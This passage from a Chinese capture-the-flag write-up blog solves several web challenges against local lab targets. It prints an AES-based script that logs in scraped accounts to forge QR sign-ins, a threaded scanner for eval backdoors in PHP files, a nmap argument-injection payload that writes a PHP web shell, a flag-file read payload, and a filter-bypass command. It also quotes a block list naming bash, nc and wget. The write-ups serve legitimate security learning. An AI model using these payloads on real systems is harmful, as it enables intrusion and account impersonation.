class="hljs-comment"># 解密前需要将 base64 编码的字符串解码为字节</span><br>    encrypted_bytes = base64.b64decode(encrypted)<br><br>    <span class="hljs-comment"># 解密</span><br>    decrypted_bytes = cipher.decrypt(encrypted_bytes)<br><br>    <span class="hljs-comment"># 去除填充</span><br>    pad = decrypted_bytes[-<span class="hljs-number">1</span>]<br>    decrypted_bytes = decrypted_bytes[:-pad]<br><br>    <span class="hljs-comment"># 将字节转换为字符串</span><br>    decrypted = decrypted_bytes.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    <span class="hljs-keyword">return</span> decrypted<br><br>key = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br>iv = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br><br><span class="hljs-comment"># 要加密的明文</span><br>plaintext = <span class="hljs-string">&quot;9613331&quot;</span><br><br><span class="hljs-comment"># 加密</span><br>encrypted_text = encrypt_by_aes(plaintext, key, iv)<br><span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;Encrypted: &#123;encrypted_text&#125;&quot;</span>)<br><span class="hljs-comment">#print(encrypted_text)</span><br><br><span class="hljs-comment"># 解密</span><br><span class="hljs-comment">#decrypted_text = decrypt_by_aes(encrypted_text, key, iv)</span><br><span class="hljs-comment">#print(f&quot;Decrypted: &#123;decrypted_text&#125;&quot;)</span><br></code></pre></td></tr></table></figure>
<p>与抓包内容对比看是否对应的上<br><img src="/images/89CE3D753D154e83931B21372005A7F6.png" srcset="/img/loading.gif" lazyload><br>一模一样<br>接着被导航到&#x2F;page&#x2F;sign&#x2F;signIn<br><img src="/images/0907CE4A836C46ffB60EAAF1CF134B15.png" srcset="/img/loading.gif" lazyload><br>扫描二维码，跳出二维码内容，进入这个网页就能签到了</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">58882</span><span class="hljs-regexp">/widget/</span>sign/e?id=<span class="hljs-number">4000000000000</span>&amp;c=<span class="hljs-number">3232369319357</span>&amp;enc=BAEEA1B833B76CFB2FF25FE93836D711&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id<br></code></pre></td></tr></table></figure>
<p><img src="/images/395C504A4F39451c92DA9DBB24A305A5.png" srcset="/img/loading.gif" lazyload><br>这里enc和signCode已经变了，但是我们可以推断出对应的是上面的c和enc值<br>接下来我们还要把网页上的用户爬下来,这里我是先保存到本地再爬的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 本地 HTML 文件路径</span><br>html_file = <span class="hljs-string">&quot;./签到.html&quot;</span>  <span class="hljs-comment"># 替换为你的本地 HTML 文件路径</span><br>output_file = <span class="hljs-string">&quot;output1.txt&quot;</span>  <span class="hljs-comment"># 保存结果的文件名</span><br><br><span class="hljs-comment"># 读取并解析 HTML 文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(html_file, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    soup = BeautifulSoup(file, <span class="hljs-string">&#x27;html.parser&#x27;</span>)<br><br><span class="hljs-comment"># 打开输出文件，以写入模式</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(output_file, <span class="hljs-string">&quot;w&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> out_file:<br>    <span class="hljs-comment"># 查找所有符合条件的 &lt;div&gt; 标签</span><br>    divs = soup.find_all(<span class="hljs-string">&#x27;div&#x27;</span>, class_=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;item zoomIn \d+&#x27;</span>))<br><br>    <span class="hljs-comment"># 提取 class 属性中的数字并保存到文件中</span><br>    <span class="hljs-keyword">for</span> div <span class="hljs-keyword">in</span> divs:<br>        class_attr = div.get(<span class="hljs-string">&#x27;class&#x27;</span>)  <span class="hljs-comment"># 获取 class 属性</span><br>        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> class_attr:<br>            <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;\d+&#x27;</span>, item)  <span class="hljs-comment"># 查找 class 属性中的数字</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                out_file.write(<span class="hljs-keyword">match</span>.group() + <span class="hljs-string">&quot;\n&quot;</span>)  <span class="hljs-comment"># 将数字写入文件并换行</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;提取的数字已保存到 <span class="hljs-subst">&#123;output_file&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>思路：<br>爬取页面用户的账户–&gt;&#x2F;v2&#x2F;apis&#x2F;sign&#x2F;refreshQRCode获取enc和signCode值–&gt;把账户AES加密–&gt;访问&#x2F;fanyalogin页面发送数据包–&gt;获取cookies值–&gt;以cookies内的身份进入二维码内容页面</p>
<p>最终代码</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br>import re<br>import base64<br><span class="hljs-keyword">from</span> Crypto.Cipher import AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding import pad<br>import time<br><br><br>def encrypt_by_aes(plaintext: str, key: str, iv: str) -&gt; str:<br>    key_bytes = key.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    iv_bytes = iv.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)<br><br>    # 将明文转为字节并进行填充（填充到块大小的倍数，通常是16字节）<br>    plaintext_bytes = pad(plaintext.encode(<span class="hljs-string">&quot;utf-8&quot;</span>), AES.block_size)<br><br>    # 加密<br>    encrypted_bytes = cipher.encrypt(plaintext_bytes)<br><br>    # 将加密后的字节进行 base64 编码<br>    encrypted = base64.b64encode(encrypted_bytes).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>    return encrypted<br><br>key = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br>iv = <span class="hljs-string">&quot;u2oh6Vu^HWe4_AES&quot;</span><br><br><br><br><br><br><span class="hljs-comment"># 保存结果的文件名</span><br>output_file = <span class="hljs-string">&quot;output1.txt&quot;</span><br><br><span class="hljs-comment"># 读取保存的数据</span><br>with open(output_file, <span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-attribute">encoding</span>=<span class="hljs-string">&quot;utf-8&quot;</span>) as file:<br>    lines = file.readlines()<br><br><span class="hljs-comment"># 循环遍历每一行数据</span><br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>    a = requests.session()<br><br>    url = <span class="hljs-string">&#x27;http://127.0.0.1:35849/v2/apis/sign/refreshQRCode&#x27;</span><br><br>    b = a.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url)<br>    <span class="hljs-built_in">print</span>(b.text)<br>    # 提取signCode<br>    signCode = re.findall(r<span class="hljs-string">&#x27;&quot;signCode&quot;:&quot;(.*?)&quot;&#x27;</span>, b.text)<br>    signCode = str(signCode)<br>    signCode = signCode.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    # 提取enc值<br>    enc = re.findall(r<span class="hljs-string">&#x27;&quot;enc&quot;:&quot;(.*?)&quot;&#x27;</span>, b.text)<br>    enc = str(enc)<br>    enc = enc.replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;signCode=&#x27;</span>, signCode)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;enc=&#x27;</span>, enc)<br><br>    number = line.strip()  # 去除行末尾的换行符<br>    plaintext = number<br>    encrypted_text = encrypt_by_aes(plaintext, key, iv)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;encrtpted==&#x27;</span>,encrypted_text)<br>    <span class="hljs-attribute">url1</span>=<span class="hljs-string">&#x27;http://127.0.0.1:35849/fanyalogin&#x27;</span><br>    data=&#123;<br>    <span class="hljs-string">&quot;fid&quot;</span>:-1,<br>    <span class="hljs-string">&quot;uname&quot;</span>:f<span class="hljs-string">&quot;&#123;encrypted_text&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:f<span class="hljs-string">&quot;&#123;encrypted_text&#125;&quot;</span>,<br>    <span class="hljs-string">&quot;refer&quot;</span>:<span class="hljs-string">&quot;https%253A%252F%252Fi.chaoxing.com&quot;</span>,<br>    <span class="hljs-string">&quot;t&quot;</span>:<span class="hljs-string">&quot;true&quot;</span>,<br>    <span class="hljs-string">&quot;forbidotherlogin&quot;</span>:0,<br>    <span class="hljs-string">&quot;doubleFactorLogin&quot;</span>:0,<br>    <span class="hljs-string">&quot;independentId&quot;</span>:0,<br>    <span class="hljs-string">&quot;independentNameId&quot;</span>:0<br>    &#125;<br><br>    cookies = &#123;<br>        <span class="hljs-string">&quot;retainlogin&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>        <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;f5ba764e-040a-400c-ae13-80fedd7caac6&quot;</span><br>    &#125;<br>    <span class="hljs-attribute">login1</span>=requests.session()<br>    login = login1.post(<span class="hljs-attribute">url</span>=url1,data=data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;data注入&quot;</span>,login)<br>    # <span class="hljs-built_in">print</span>(login.cookies)<br>    cook = login.cookies<br>    <span class="hljs-built_in">print</span>(cook)<br>    <span class="hljs-keyword">for</span> cookie <span class="hljs-keyword">in</span> cook:<br>        <span class="hljs-keyword">if</span> cookie.name == <span class="hljs-string">&quot;token&quot;</span>:<br>            token_value = cookie.value #token值<br>            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;token=&#123;token_value&#125;&quot;</span>)<br>            cookies[<span class="hljs-string">&quot;token&quot;</span>]=token_value<br>            break  # 找到后就可以停止遍历<br>    <span class="hljs-built_in">print</span>(cookies)<br><br>    url2 =f<span class="hljs-string">&#x27;http://127.0.0.1:35849/widget/sign/e?id=4000000000000&amp;c=&#123;signCode&#125;&amp;enc=&#123;enc&#125;&amp;DB_STRATEGY=PRIMARY_KEY&amp;STRATEGY_PARA=id&#x27;</span><br>    <span class="hljs-attribute">login3s</span>=requests.session()<br>    login3 = login3s.<span class="hljs-built_in">get</span>(<span class="hljs-attribute">url</span>=url2,cookies=cookies)<br>    <span class="hljs-built_in">print</span>(login3)<br>    time.sleep(0.5)<br></code></pre></td></tr></table></figure>


<h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p><img src="/images/395D0C10155740ceBB6309AC7D96DDC1.png" srcset="/img/loading.gif" lazyload><br>源码已经打包好了，下载<br><img src="/images/D5F774D3C3B54f31895C86EEC33ACD87.png" srcset="/img/loading.gif" lazyload><br>发现有三千多个php文件，且基本上每个文件都有eval可能会被利用，但毕竟三千多个文件我们不可能会一个一个试，所以我们写一个自动化脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;开始时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="hljs-comment"># 只是一个简单的时间函数，看起来更漂亮罢了</span><br>s1 = threading.Semaphore(<span class="hljs-number">100</span>)  <span class="hljs-comment"># 这儿设置最大的线程数</span><br>filePath = <span class="hljs-string">r&quot;D:/websafe/phpstudy/phpstudy_pro/WWW/www/src/&quot;</span><br>os.chdir(filePath)  <span class="hljs-comment"># 改变当前的路径，这个还是不太懂</span><br>requests.adapters.DEFAULT_RETRIES = <span class="hljs-number">5</span>  <span class="hljs-comment"># 设置重连次数，防止线程数过高，断开连接</span><br>files = os.listdir(filePath)  <span class="hljs-comment"># 得到该目录下所有文件的名称</span><br>session = requests.Session()  <span class="hljs-comment"># 得到session()为之后的实现代码回显得取创造条件</span><br>session.keep_alive = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 设置连接活跃状态为False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_content</span>(<span class="hljs-params">file</span>):<br>    s1.acquire()  <span class="hljs-comment"># 好像与锁什么的相关，但是还是不太懂，多线程开启</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;trying   &#x27;</span> + file + <span class="hljs-string">&#x27;     &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="hljs-comment"># 更好看，同时可以对比不加线程和加线程的时间对比</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># 打开php文件，提取所有的$_GET和$_POST的参数</span><br>        gets = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>        posts = <span class="hljs-built_in">list</span>(re.findall(<span class="hljs-string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))<br>    data = &#123;&#125;  <span class="hljs-comment"># 所有的$_POST</span><br>    params = &#123;&#125;  <span class="hljs-comment"># 所有的$_GET</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> gets:<br>        params[m] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> posts:<br>        data[n] = <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span><br>    url = <span class="hljs-string">&#x27;http://127.0.0.1/www/src/&#x27;</span> + file<br>    req = session.post(url, data=data, params=params)  <span class="hljs-comment"># 一次性请求所有的GET和POST</span><br>    req.close()  <span class="hljs-comment"># 关闭请求  释放内存</span><br>    req.encoding = <span class="hljs-string">&#x27;utf-8&#x27;</span><br>    content = req.text<br>    <span class="hljs-comment"># print(content)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:  <span class="hljs-comment"># 如果发现有可以利用的参数，继续筛选出具体的参数</span><br>        flag = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> gets:<br>            req = session.get(url + <span class="hljs-string">&#x27;?%s=&#x27;</span> % a + <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)<br>            content = req.text<br>            req.close()  <span class="hljs-comment"># 关闭请求  释放内存</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                flag = <span class="hljs-number">1</span><br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> posts:<br>                req = session.post(url, data=&#123;b: <span class="hljs-string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)<br>                content = req.text<br>                req.close()  <span class="hljs-comment"># 关闭请求  释放内存</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;xxxxxx&quot;</span> <span class="hljs-keyword">in</span> content:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:  <span class="hljs-comment"># flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span><br>            param = a<br>        <span class="hljs-keyword">else</span>:<br>            param = b<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;找到了利用文件： &#x27;</span> + file + <span class="hljs-string">&quot;  and 找到了利用的参数：%s&quot;</span> % param)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))<br>    s1.release()  <span class="hljs-comment"># 对应于之前的多线程打开</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> files:  <span class="hljs-comment"># 加入多线程</span><br>    t = threading.Thread(target=get_content, args=(i,))<br>    t.start()<br></code></pre></td></tr></table></figure>
<p>多线程还是快，用了其它脚本跑了几个小时<br><img src="/images/DC50DBF7CED349ac8E10BDB40CC53E96.png" srcset="/img/loading.gif" lazyload><br>找到可以利用的文件和参数，进入靶场<br><img src="/images/251250150BDA4b88AF294AEB1C1B80ED.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p><img src="/images/FF0F9B418D7E4eb7ADF528F15FEAE10D.png" srcset="/img/loading.gif" lazyload><br>启动靶机，执行nmap命令<br>先输入正常内容127.0.0.1<br><img src="/images/81815F7490084ee289012E710D1DA539.png" srcset="/img/loading.gif" lazyload><br>看看能不能命令执行<br><img src="/images/5CB659C4FF1D452288D9E0EE60CFC5E5.png" srcset="/img/loading.gif" lazyload><br>可以看到|被\转义，应该是被escapeshellarg()和escapeshellcmd()转义<br>尝试使用其它管道符，也显示错误<br>nmap的一些用法</p>
<ul>
<li>-oN 标准保存</li>
<li>-oX XML保存</li>
<li>-oG Grep保存</li>
<li>-oA 保存到所有格式</li>
<li>-append-output 补充保存文件</li>
</ul>
<p>payload</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">&#x27; </span><span class="language-php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;a&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml"> -oG 1.phtml &#x27;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/B1F50110F98D43ddAAC362EB6CC4EDFE.png" srcset="/img/loading.gif" lazyload><br>这里已经绕过了escapeshellarg和escapeshellcmd,虽然显示错误，但是已经成功写入1.phtml<br>php应该是被过滤了，采用phtml和?&#x3D;替代php<br>最终flag</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> &#x27; &lt;?= @eval($_POST<span class="hljs-string">[&quot;a&quot;]</span>);?&gt; -oG <span class="hljs-number">1</span>.phtml &#x27;<br></code></pre></td></tr></table></figure>
<p>在1.phtml命令执行即可<br><img src="/images/06F8D62AE11C4d32A11A397D4B278B34.png" srcset="/img/loading.gif" lazyload></p>
<p>还有一种做法</p>
<ul>
<li>-iL读取扫描文件</li>
</ul>
<p>payload</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> &#x27; -iL /flag -o xixi &#x27;<br></code></pre></td></tr></table></figure>
<p><img src="/images/1CC4B5A965F8419c99F6F03620BBB576.png" srcset="/img/loading.gif" lazyload></p>
<p>源码</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?<br><span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;settings.php&#x27;</span>);<br><br><br>set_time_limit(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (isset($_POST[<span class="hljs-string">&#x27;host&#x27;</span>])):<br>	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">defined</span>(<span class="hljs-string">&#x27;WEB_SCANS&#x27;</span>)) &#123;<br>        	<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Web scans disabled&#x27;</span>);<br>	&#125;<br><br>	$host = $_POST[<span class="hljs-string">&#x27;host&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(stripos($host,<span class="hljs-string">&#x27;php&#x27;</span>)!==false)&#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>	&#125;<br>	$host = escapeshellarg($host);<br>	$host = escapeshellcmd($host);<br><br>	$filename = <span class="hljs-keyword">substr</span>(md5(<span class="hljs-keyword">time</span>() . <span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>)), <span class="hljs-number">0</span>, <span class="hljs-number">5</span>);<br>	$command = <span class="hljs-string">&quot;nmap &quot;</span>. NMAP_ARGS . <span class="hljs-string">&quot; -oX &quot;</span> . RESULTS_PATH . $filename . <span class="hljs-string">&quot; &quot;</span> . $host;<br>	$result_scan = shell_exec($command);<br>	<span class="hljs-keyword">if</span> (is_null($result_scan)) &#123;<br>		<span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something went wrong&#x27;</span>);<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		header(<span class="hljs-string">&#x27;Location: result.php?f=&#x27;</span> . $filename);<br>	&#125;<br><span class="hljs-keyword">else</span>:<br>?&gt;<br></code></pre></td></tr></table></figure>


<h2 id="SWPUCTF-2021-新生赛-finalrce"><a href="#SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="[SWPUCTF 2021 新生赛]finalrce"></a>[SWPUCTF 2021 新生赛]finalrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$url</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\&quot;|\&gt;|\&lt;|\%|\$/i&#x27;</span>,<span class="hljs-variable">$url</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you can&#x27;t use this.&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Can you see anything?&quot;</span>;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$url</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>过滤了很多函数<br>可以先用whomai和pwd这些没禁用的函数看看，发现没有回显,无回显RCE<br>尝试写入文件<br>这里用到tee命令：</p>
<p>Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。<br>payload</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">l\s /<span class="hljs-string">|tee 1.txt</span><br></code></pre></td></tr></table></figure>
<p>l\s绕过这在linux中是允许的，同样的还有l’’s和l””s<br><img src="/images/2CAC52B611214c51A1536E7E77C0C19F.png" srcset="/img/loading.gif" lazyload><br><img src="/images/554051CD0A7742f19B4D30F99825DD91.png" srcset="/img/loading.gif" lazyload><br>或者用模糊查询</p>
